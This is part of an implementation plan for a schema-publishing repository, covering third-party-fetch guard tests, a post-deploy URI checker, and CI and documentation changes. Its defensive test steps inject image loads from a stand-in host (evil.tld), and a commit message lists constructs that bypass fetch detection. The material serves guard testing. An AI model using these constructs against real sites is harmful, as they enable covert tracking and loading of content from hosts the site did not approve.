_IN_TEXT = re.compile(r"""\bhttps?://([^\s/?#'\"),]+)""", re.I)

# CSS reaches the network only through url(), image-set(), and @import. That set is
# closed, unlike the HTML one, so enumerating it here is safe. Comments are stripped
# first because a vendor licence banner carries URLs that fetch nothing, and data:
# payloads are skipped because an inlined SVG carries an xmlns that is not a request.
_CSS_COMMENT = re.compile(r"/\*.*?\*/", re.S)
_CSS_FETCH = re.compile(
    r"""(?:url\(\s*|image-set\(\s*|@import\s+(?:url\(\s*)?)['"]?([^'")\s]+)""", re.I
)
_CSS_HOST = re.compile(r"""^(?:[a-z][a-z0-9+.-]*:)?//([^/?#]+)""", re.I)

# Scripts under this path come from the installed theme and are pinned by uv.lock.
# The prefix is relative to the mkdocs output root, which is the directory the
# built_site fixture builds into and _site/docs in the deploy workflow. A prefix,
# not a substring: as a substring any path merely containing the segment passes.
VENDORED_PREFIXES = ("assets/javascripts/",)


def write_schema(root: Path, rel: str, sid: str, body: dict | None = None) -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    doc = {"$id": sid}
    doc.update(body or {})
    path.write_text(json.dumps(doc), encoding="utf-8")
    return path


class _Scanner(html.parser.HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.attr_values: list[str] = []
        self.text_values: list[str] = []
        self.bases: list[str] = []
        self._capturing: str | None = None

    def _collect(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        seen = dict(attrs)
        if tag == "base":
            self.bases.append(seen.get("href") or "")
        speculative = bool(set((seen.get("rel") or "").lower().split()) & SPECULATIVE_REL)
        for name, value in attrs:
            if not value:
                continue
            if name.split(":")[0] in NON_FETCHING_ATTRS:
                continue
            if (tag, name) in NON_FETCHING and not speculative:
                continue
            self.attr_values.append(value)

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self._collect(tag, attrs)
        if tag in ("script", "style"):
            self._capturing = tag

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        # A self-closed script or style has no body. Aliasing this to handle_starttag
        # would leave capturing switched on for the rest of the document, so every
        # later paragraph would be scanned as if it were script text.
        self._collect(tag, attrs)

    def handle_endtag(self, tag: str) -> None:
        if tag == self._capturing:
            self._capturing = None

    def handle_data(self, data: str) -> None:
        if self._capturing:
            self.text_values.append(data)


def _scan(markup: str) -> _Scanner:
    scanner = _Scanner()
    scanner.feed(markup)
    return scanner


def third_party_hosts(markup: str, self_hosts: set[str]) -> set[str]:
    """Return every third-party host the markup would fetch from.

    A base element counts, because it redirects every relative URL on the page. It is
    folded in here rather than offered as a second function each caller has to
    remember, since coverage a call site opts into is how this guard came to be
    incomplete five times.
    """
    scanner = _scan(markup)
    hosts: set[str] = set()
    for value in scanner.attr_values + scanner.bases:
        hosts |= {m.group(1).lower() for m in _IN_ATTR.finditer(_NOISE.sub("", value))}
    for value in scanner.text_values:
        hosts |= {m.group(1).lower() for m in _IN_TEXT.finditer(_NOISE.sub("", value))}
    return hosts - {host.lower() for host in self_hosts}


def external_bases(markup: str) -> list[str]:
    """Return every base element href, for a test that names the construct directly."""
    return [href for href in _scan(markup).bases if href]


def stylesheet_hosts(css: str, self_hosts: set[str]) -> set[str]:
    """Return every third-party host a stylesheet would fetch from."""
    hosts: set[str] = set()
    for match in _CSS_FETCH.finditer(_CSS_COMMENT.sub(" ", css)):
        value = match.group(1)
        if value.lower().startswith("data:"):
            continue
        host = _CSS_HOST.match(value)
        if host:
            hosts.add(host.group(1).lower())
    return hosts - {host.lower() for host in self_hosts}
```

- [ ] **Step 4: Update the two consumers**

`tests/test_site_config.py:59-65` scans built assets. Passing minified CSS to the HTML scanner reports `fontawesome.com` and `www.w3.org`, from a licence banner and an inlined `data:` SVG, neither of which is a request. Replace the body:

```python
    from conftest import stylesheet_hosts, third_party_hosts

    offenders: dict[str, str] = {}
    for asset in built_site.rglob("*.html"):
        for host in third_party_hosts(asset.read_text(encoding="utf-8"), SELF_HOSTS):
            offenders.setdefault(host, asset.name)
    for asset in built_site.rglob("*.css"):
        for host in stylesheet_hosts(asset.read_text(encoding="utf-8"), SELF_HOSTS):
            offenders.setdefault(host, asset.name)
    assert not offenders, f"third-party resource loads: {offenders}"
```

`tests/test_landing_page.py:51-54` does the same thing inline. Line 54 passes `acs.css` to `third_party_hosts` and must call `stylesheet_hosts` instead.

Add to `tests/test_site_config.py`, which owns the `built_site` fixture:

```python
def test_no_first_party_javascript_ships(built_site):
    """Every script comes from the pinned theme.

    A prefix, not a substring. A path merely containing assets/javascripts/ can be
    our own code sitting in the docs tree.
    """
    from conftest import VENDORED_PREFIXES

    stray = [
        p.relative_to(built_site).as_posix()
        for p in built_site.rglob("*.js")
        if not p.relative_to(built_site).as_posix().startswith(VENDORED_PREFIXES)
    ]
    assert stray == [], f"first-party JavaScript needs a human decision: {stray}"
```

The `built_site` fixture runs `mkdocs build` directly into a temporary directory, so paths are relative to the mkdocs output root and carry no `docs/` prefix. Verified against a real build: 36 vendored files, all under `assets/javascripts/`, none stray.

- [ ] **Step 5: Run the tests**

Run: `uv run pytest -q`
Expected: PASS.

- [ ] **Step 6: Watch the guard bite, then revert**

A guard found incomplete five times is verified by watching it fail, not by reading it.

```bash
printf '\n<img src="https://cdn.evil.tld/p.png">\n' >> docs/README.md
uv run pytest -q ; echo "^ must FAIL"
git checkout docs/README.md
printf '\nbody{background-image:image-set("https://evil.tld/x.png" 1x)}\n' >> docs/stylesheets/extra.css
uv run pytest -q ; echo "^ must FAIL"
git checkout docs/stylesheets/extra.css
uv run pytest -q ; echo "^ must PASS"
git diff --quiet && echo "tree clean"
```

Expected: FAIL, FAIL, PASS, `tree clean`.

- [ ] **Step 7: Commit**

```bash
git add tests/
git commit -F - <<'MSG'
Treat every attribute as a fetch unless it is on the exempt list

The guard has been found incomplete five times. Each earlier fix named the
attribute that had been missed, which left the next one open. Eleven constructs
defeated the last version: a base element, an inline script body, SVG use and
image, a meta refresh, image-set in CSS, a tab inside the scheme, a second fetch
attribute on the same tag, anchor ping, a form a script submits on load, and an
anchor carrying rel=prefetch.

It now parses the markup and walks every attribute on every element, treating
each as a fetch unless the pair sits on a short exempt list. Form action is not
on that list, because a form needs no click when a script calls submit(). An
anchor loses its exemption when it carries a speculative rel. Script and style
bodies are scanned. Tab and newline are stripped before matching, because the
URL parser strips them before resolving. A base element is folded into the same
result rather than offered as a separate call, since coverage a call site opts
into is how this guard reached five incomplete versions.

Stylesheets get their own scanner. CSS reaches the network only through url(),
image-set(), and @import, so that set can be enumerated safely, and comments and
data: payloads are excluded. Running the HTML scanner over minified theme CSS
reported a licence banner and an inlined SVG namespace as third-party fetches,
which is the kind of noise that gets a guard switched off.

The vendored-script check becomes a prefix test anchored to the mkdocs output
root. As a substring it accepted docs/assets/javascripts/tracker.js as pinned
theme code.

Measured against a real build: no third-party host on any page, no base element,
and 36 vendored scripts with none stray.
MSG
```

---

### Task 5: Verify every published URI

**Files:**
- Modify: `tools/verify_published.py`
- Create: `tests/test_verify_published.py`
- Modify: `.github/workflows/deploy-pages.yml`, `.github/workflows/monitor-pages.yml`

**Interfaces:**
- Consumes: `target_for(doc, path, source)` from Task 1, `load_schemas` from Task 2.
- Produces: `paths_from(source: Path) -> list[str]`, returning tails such as `v0.1.0/acs_schema.json` with no `schema/` prefix.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_verify_published.py`. The import convention matters: a module-level `import tools.verify_published` raises `ModuleNotFoundError` and aborts collection for the whole suite, hiding every other test.

```python
"""The module had no test file, so three of its defects shipped unnoticed."""
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tools"))

import verify_published as vp


@pytest.fixture(autouse=True)
def no_sleeping(monkeypatch):
    """Six attempts at ten seconds each would make this suite a minute slower."""
    calls = []
    monkeypatch.setattr(vp.time, "sleep", lambda seconds: calls.append(seconds))
    return calls


def test_a_non_object_body_is_not_retried(monkeypatch, no_sleeping):
    """It parsed and it is wrong. Waiting cannot change that, and .get would raise."""
    monkeypatch.setattr(vp, "fetch", lambda url: ["not", "an", "object"])
    with pytest.raises(SystemExit, match="not a JSON object"):
        vp.check("https://example.com", "v0.1.0/a.json")
    assert no_sleeping == []


def test_a_decoding_failure_is_retried(monkeypatch, no_sleeping):
    def boom(url):
        raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")

    monkeypatch.setattr(vp, "fetch", boom)
    with pytest.raises(SystemExit, match="never became available"):
        vp.check("https://example.com", "v0.1.0/a.json")
    assert len(no_sleeping) == vp.ATTEMPTS - 1, "no sleep after the final attempt"


def test_a_wrong_id_reports_what_was_served(monkeypatch, no_sleeping):
    monkeypatch.setattr(vp, "fetch", lambda url: {"$id": "https://elsewhere/x.json"})
    with pytest.raises(SystemExit, match="serves \\$id"):
        vp.check("https://example.com", "v0.1.0/a.json")


def test_paths_come_from_the_schema_tree(tmp_path):
    """Two hardcoded paths in two workflows left 42 of 44 URIs unchecked."""
    base = "https://genai-security-project.github.io/agent-control-standard/schema/"
    src = tmp_path / "spec"
    (src / "v0.1.0" / "hooks").mkdir(parents=True)
    for rel in ("v0.1.0/a.json", "v0.1.0/hooks/b.json"):
        (src / rel).write_text(json.dumps({"$id": base + rel}))
    assert vp.paths_from(src) == ["v0.1.0/a.json", "v0.1.0/hooks/b.json"]
```

- [ ] **Step 2: Run it to verify it fails**

Run: `uv run pytest tests/test_verify_published.py -q`
Expected: three failures. The non-object case raises `AttributeError` on `.get`, the decode case is not caught by the retry clause, and `paths_from` does not exist. `test_a_wrong_id_reports_what_was_served` passes already, because a dict reports correctly on the old path too. It is a drift test guarding a message, and it stays.

- [ ] **Step 3: Fix the checker and derive the path list**

In `tools/verify_published.py`, add `from pathlib import Path` to the imports, then add `paths_from` and replace `check`:

```python
def paths_from(source: Path) -> list[str]:
    """Derive every publishable path from the schema tree.

    Returns tails such as v0.1.0/acs_schema.json. The caller supplies the base URL
    including the /schema segment, matching how the workflows already join the two.

    Two hardcoded paths duplicated across two workflows left 42 of the 44 published
    URIs with no post-deploy check and nothing keeping the two copies in step.
    """
    from publish_schemas import load_schemas, target_for

    return sorted(target_for(doc, path, source) for path, doc in load_schemas(source).items())


def check(base: str, path: str) -> None:
    url = f"{base.rstrip('/')}/{path}"
    last: Exception | None = None
    for attempt in range(1, ATTEMPTS + 1):
        try:
            doc = fetch(url)
        except (urllib.error.URLError, json.JSONDecodeError, UnicodeDecodeError) as error:
            last = error
            print(f"attempt {attempt}/{ATTEMPTS}: {url} not ready ({error})")
            if attempt < ATTEMPTS:
                time.sleep(DELAY_SECONDS)
            continue
        if not isinstance(doc, dict):
            # It parsed and it is wrong. Retrying cannot change a served document,
            # and .get on a list raises an AttributeError instead of reporting.
            raise SystemExit(f"::error::{url} is not a JSON object, served {type(doc).__name__}")
        served = doc.get("$id")
        if served != url:
            raise SystemExit(f"::error::{url} serves $id {served!r}, expected its own URL")
        print(f"ok: {url} serves its own $id")
        return
    raise SystemExit(f"::error::{url} never became available: {last}")
```

Replace `main`:

```python
def main(argv: list[str]) -> int:
    if len(argv) >= 4 and argv[2] == "--from":
        paths = paths_from(Path(argv[3]))
    elif len(argv) >= 3:
        paths = argv[2:]
    else:
        print(
            "usage: verify_published.py <base-url> --from <schema-source-dir>\n"
            "   or: verify_published.py <base-url> <path> [<path> ...]",
            file=sys.stderr,
        )
        return 2
    for path in paths:
        check(argv[1], path)
    return 0
```

- [ ] **Step 4: Point both workflows at the whole tree, with the right base**

This is the step to get exactly right. `PAGE_URL` is the site root, and the current invocations carry the `schema/` segment inside each hardcoded path. `paths_from` returns tails without it, so the base must gain the segment or every URL 404s.

In `.github/workflows/deploy-pages.yml`, replace lines 119-121 with:

```yaml
          python3 tools/verify_published.py "${PAGE_URL%/}/schema" --from specification
```

In `.github/workflows/monitor-pages.yml`, replace lines 25-27 with the same line.

Add `timeout-minutes: 20` to both jobs. Forty-four checks at six attempts and ten seconds apiece can run for well over half an hour during a real outage, and neither job sets a limit today, so a failing run holds a runner against GitHub's six-hour default.

- [ ] **Step 5: Add the branch check to the two build steps**

The `deploy` job already carries `github.event_name != 'pull_request' && github.ref == 'refs/heads/main'`. The Configure Pages and Upload steps carry only the event half, so a `workflow_dispatch` from any branch configures Pages and uploads an artifact that the deploy job then declines to publish.

Add one step near the top of the `build` job:

```yaml
      - name: Decide whether this run deploys
        id: gate
        run: echo "publish=${{ github.event_name != 'pull_request' && github.ref == 'refs/heads/main' }}" >> "$GITHUB_OUTPUT"
```

Change both steps' conditions from `if: github.event_name != 'pull_request'` to `if: steps.gate.outputs.publish == 'true'`.

This is a deliberate behavior change, not a cleanup. A dispatch from a feature branch stops producing a Pages artifact. That is the point of the finding: the artifact was never publishable. If the gate step is ever skipped, the output is empty and both steps fail closed.

- [ ] **Step 6: Run the tests, check the workflows, check the live site**

```bash
uv run pytest -q
uv run python -c "import yaml,pathlib; [yaml.safe_load(p.read_text()) for p in pathlib.Path('.github/workflows').glob('*.yml')]; print('workflows parse')"
uv run python tools/verify_published.py \
  https://genai-security-project.github.io/agent-control-standard/schema --from specification
```

Expected: PASS, `workflows parse`, and 44 lines of `ok:`. That last command mirrors what the edited workflow now builds, base segment included.

- [ ] **Step 7: Commit**

```bash
git add tools/verify_published.py tests/test_verify_published.py .github/workflows/
git commit -F - <<'MSG'
Verify every published URI, not two of forty-four

The post-deploy check named two paths, hardcoded identically in two workflows
with nothing keeping them in step. A defect in any of the other 42 shipped
undetected. The list now comes from the schema tree, which both workflows
already check out, and the /schema segment moves from each path into the base
URL so the two halves join correctly.

The checker had no test file, so three defects sat in it. A body that parsed as
a list raised AttributeError on .get instead of reporting. A decoding failure
was not retried. The loop slept ten seconds after its final attempt before
giving up. Both jobs also gain a timeout, because 44 checks with six attempts
apiece can outlive a runner's usefulness during a real outage.

A note on the non-object guard, because the earlier reasoning for it was wrong.
A Pages 404 serves HTML, which fails to parse and is retried, so that was not
the scenario. The guard is still right: a parsed non-object cannot be fixed by
waiting.

Configure Pages and the artifact upload now carry the branch check the deploy
job already had. This is a behavior change, not a deduplication: a dispatch from
a feature branch stops building an artifact that was never publishable.
MSG
```

---

### Task 6: The starburst, the documents, and the ownership

**Files:**
- Modify: `landing/assets/starburst.svg`, `tests/test_landing_page.py`
- Modify: `SECURITY.md`, `CLAUDE.md`, `LICENSING.md`, `.github/CODEOWNERS`, `.gitignore`
- Modify: `design/2026-09-05-github-pages-landing.md`, `design/2026-09-05-deferred-findings-design.md`
- Modify: `tools/publish_schemas.py` (one comment), `tests/test_publish_schemas.py` (one test)

**Interfaces:**
- Consumes: nothing. This task is independent of Tasks 1 through 5.
- Produces: nothing later tasks use.

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_landing_page.py`. Read the file first for how it loads the SVG, and add `import xml.etree.ElementTree as ET` if absent:

```python
def test_the_starburst_sets_its_font_on_the_root_element():
    """On the root, not merely present once.

    A declaration on the wrong element satisfies a count while leaving labels
    without a fallback stack.
    """
    starburst = (LANDING / "assets" / "starburst.svg").read_text(encoding="utf-8")
    root = ET.fromstring(starburst)
    assert "font-family" in root.attrib
    assert "sans-serif" in root.attrib["font-family"], "needs a fallback, not Inter alone"
    assert starburst.count("font-family") == 1, "the per-element copies should be gone"
```

Add to `tests/test_publish_schemas.py`, the drift test the spec asks for alongside finding 3's closure:

```python
def test_a_percent_encoded_id_is_named_as_such(tmp_path):
    """SAFE_TAIL alone would reject this, with a message about the pattern.

    The percent-decode check exists to label the attempt, so a build log tells an
    operator someone tried something rather than that someone made a typo. Assert
    the specific message, or the check can be deleted with no test noticing.
    """
    with pytest.raises(SchemaError, match="must not be percent-encoded"):
        target_for({"$id": BASE + "v0.1.0/%2e%2e/x.json"}, Path("a.json"), Path("."))
```

- [ ] **Step 2: Run them to verify they fail**

Run: `uv run pytest tests/test_landing_page.py tests/test_publish_schemas.py -q`
Expected: the starburst test fails because the root carries no `font-family` and fifteen `<text>` elements do. The percent-encoding test passes already, which is correct: it is a drift test, guarding a behavior that exists. Confirm it is load-bearing by commenting out the `unquote` check and watching it fail, then restore.

- [ ] **Step 3: Move the font declaration to the root**

In `landing/assets/starburst.svg`, add to the root `<svg>` element:

```
font-family="Inter, system-ui, -apple-system, Segoe UI, Roboto, sans-serif"
```

Delete the `font-family="Inter, sans-serif"` attribute from all fifteen `<text>` elements. A `<text>` inside a `<g>` inherits it. This changes the landing page's served bytes on purpose, since the SVG is inlined at build time. The Global Constraints promise of byte-identity covers the schema tree, not this file.

- [ ] **Step 4: Correct the documents**

`SECURITY.md`. The scope table is two parallel lists, not a boolean matrix, and two rows name `.github/workflows/`. Replace the entire table, lines 22 through 31, with this exact text. It merges the two overlapping in-scope rows, removes `once Pages is enabled`, and keeps every out-of-scope entry:

```markdown
| In scope | Out of scope |
| --- | --- |
| Flaws in the ACS specification that lead implementers into insecure designs | The marketing site at agentcontrolstandard.org, which is built and deployed from a separate repository |
| Errors in the JSON Schemas under `specification/` | Findings against third-party agent frameworks that happen to implement ACS |
| The build and publish tooling in `tools/` and the GitHub Actions workflows in `.github/workflows/` | Automated scanner output with no demonstrated impact |
| Hook or event definitions that leak sensitive data by design | Missing security headers on sites we do not operate |
| Supply-chain issues in this repository's dependencies | Social engineering of maintainers or contributors |
| The published site at genai-security-project.github.io/agent-control-standard, including the landing page, the documentation, and the schema endpoints | Missing security response headers on the Pages site, which GitHub Pages does not allow us to set |
```

`CLAUDE.md`. Replace the sentence at line 125, `The landing page links both, so publishing an address does not pull reports out of the processes that handle them independently.`, with:

```markdown
The landing page links the security reporting process and the Code of Conduct process, so
publishing an address does not pull reports out of the processes that handle them
independently.
```

`LICENSING.md`. Move the provenance section to sit **immediately** after the scope table it explains, ahead of "Why the split". It currently sits last in the file, which satisfies "after" while leaving four sections between the table and its explanation.

`.gitignore`. Add under the existing scratch entries:

```
# Browser session logs. Never committed.
.playwright-mcp/
```

- [ ] **Step 5: Widen the restricted ownership tier**

In `.github/CODEOWNERS`, add four lines after the wide default, since later rules win. Copy the handle list verbatim from an existing restricted line rather than retyping it:

```
/CLAUDE.md       @rocklambros @fewdisc @GangGreenTemperTatum @mamicidal @sclintonowasp
/STYLE.md        @rocklambros @fewdisc @GangGreenTemperTatum @mamicidal @sclintonowasp
/CONTRIBUTING.md @rocklambros @fewdisc @GangGreenTemperTatum @mamicidal @sclintonowasp
/design/         @rocklambros @fewdisc @GangGreenTemperTatum @mamicidal @sclintonowasp
```

`CONTRIBUTING.md` carries the canonical schema path a contributor follows, and this plan edits it in Task 1.

- [ ] **Step 6: Record the closure and the follow-up**

In `tools/publish_schemas.py`, above the percent-decode check:

```python
    # SAFE_TAIL admits no % in any character class, so this is not the layer that
    # stops a percent-encoded traversal. It stays because it labels the attempt.
    # An operator reading a build log can tell someone trying something from
    # someone making a typo.
```

In `design/2026-09-05-github-pages-landing.md`, add to the Rollback section:

```markdown
A failed verification step is not a failed deploy. `actions/deploy-pages` runs before the
check, so a red run with a green deploy job means the site is live and the check could not
confirm it inside its retry window. Read the step log before reverting anything. Reverting
a good deploy because a check was unlucky costs more than waiting for the next run.
```

Append to `design/2026-09-05-deferred-findings-design.md`:

```markdown
## Tracked follow-up: specification/schema.lock

Deferred three times now. Published schemas are mutable in place with no hash record, so a
constraint loosened under a released spec version reaches every consumer resolving that
`$id` with no way to detect the change against a copy fetched earlier.

The work is a manifest of every published path and its hash, written at build time and
checked at deploy time. It carries release-process implications this change does not, which
is why it stays out of scope rather than being folded in.

This record replaces the public tracking issue an earlier plan specified. Opening one is
the project lead's decision to make separately, and `SECURITY.md` routes tooling flaws to
private reporting.
```

- [ ] **Step 7: Run everything**

```bash
uv run pytest -q
rm -rf /tmp/final && mkdir -p /tmp/final
GITHUB_PAGES_URL="https://genai-security-project.github.io/agent-control-standard" \
  uv run mkdocs build --strict -d /tmp/final/docs
uv run python tools/render_landing.py landing /tmp/final
uv run python tools/publish_schemas.py specification /tmp/final/schema
find /tmp/final/schema -type f | wc -l
diff -r /tmp/t1 /tmp/final/schema && echo "schema tree IDENTICAL"
```

Expected: PASS, a clean build of all three surfaces, `44`, and `schema tree IDENTICAL`.

- [ ] **Step 8: Commit**

```bash
git add landing/assets/starburst.svg tests/ SECURITY.md CLAUDE.md \
        LICENSING.md .github/CODEOWNERS .gitignore design/ tools/publish_schemas.py
git commit -F - <<'MSG'
Correct the documents, widen the ownership tier, fix the starburst font

The starburst declared font-family on fifteen text elements and none on the
root, so a label would render without the fallback stack if one declaration
were dropped. It inherits from the root now, which changes the landing page's
served bytes on purpose.

SECURITY.md described the published site as conditional on Pages being enabled.
The site is live, and a conditional about a live property gives a defensive
reading room to argue it was out of scope. Two rows naming the workflows merge
into one, and every out-of-scope entry is preserved.

CLAUDE.md had a sentence whose subject was ambiguous about which two processes
the landing page links.

CODEOWNERS gains CLAUDE.md, STYLE.md, CONTRIBUTING.md, and design/. An earlier
attempt at this called CLAUDE.md the one root document absent from the
restricted tier, which was wrong: seven others were equally absent. STYLE.md
binds every text edit in the repository, CONTRIBUTING.md carries the canonical
schema path, and design/ holds the documents arguing the threat model for a
live publishing pipeline.

The percent-decode check gains the drift test its closure promised. Asserting
only that some error is raised would let the check be deleted with SAFE_TAIL
catching the case incidentally and no test noticing.

The schema.lock follow-up is recorded in the design document rather than a
public issue. SECURITY.md routes tooling flaws to private reporting, and an
implementation plan is the wrong place for a disclosure decision.
MSG
```

---

## After the tasks

Two actions outside the code, both approved by the project lead:

1. Add `test` and `build` as required status checks on the `protect-main` ruleset. It requires one approval and code-owner review today, and requires no passing check, so a pull request can merge red onto the branch that deploys on merge. `deploy` and `check` must not be required: `deploy` never runs on a pull request and `check` is the scheduled monitor, so requiring either would deadlock every merge. The admin bypass stays as it is.
2. Run `superpowers:finishing-a-development-branch`, merging as admin.

## Self-Review

**Spec coverage.** All 38 findings map to a task. 1, 23, 33, 34 to Task 2. 2 to Task 1. 3, 12 through 17, 20, 28, 30, 31 to Task 6. 4, 5, 24 through 27 to Task 3. 6, 7, 8, 18, 19, 36, 37 to Task 5. 9, 10, 11, 21, 22, 35 to Task 4. 29 to the section above. 32 and 38 are recorded out of scope in the spec.

**Deviations from the spec, all three listed.** The spec says `load_schemas` returns bytes alongside each document. The plan adds a private `_read` and leaves `load_schemas` unchanged, so `render_landing.py` needs no edit for it. The spec describes the `xmlns` exemption as covering `xmlns`. The plan exempts any attribute whose prefix before a colon is `xmlns`, which also covers `xmlns:xlink`. The spec describes `external_bases` as a separate check. The plan folds base hrefs into `third_party_hosts` as well, so a call site cannot omit the check, and keeps `external_bases` only for the test that names the construct.

**Placeholder scan.** No TBD, no "add error handling", no "similar to Task N". Every code step carries its code, and the CODEOWNERS handles are spelled out rather than described.

**Type consistency.** `target_for` takes three parameters from Task 1 onward, and Tasks 2, 3, 5, and 6 all pass `source`. `_read` returns `dict[Path, tuple[dict, bytes]]` and only Task 2 consumes it. `_versions` returns `dict[str, int]` from Task 3, changed from `set[str]`, and `_schema_facts` is its only caller. `VENDORED_PREFIXES` is a tuple, and `str.startswith` accepts one. `paths_from` returns tails with no `schema/` prefix, and Task 5 Step 4 puts that segment in the base URL to match.

**Test breakage is named, not discovered.** Task 1 Step 1 lists every existing test the signature change breaks, because the previous version of this plan promised a green suite and produced 14 failures at the first task. Every test import uses the repository's existing convention, because a module-level `import tools.x` aborts collection for the entire suite and reports nothing at all.

**Ordering.** The starburst test sits in Task 6 with the starburst fix. An earlier version put it in Task 4, where that task's own verification promised a passing suite that could not pass until Task 5 had run.
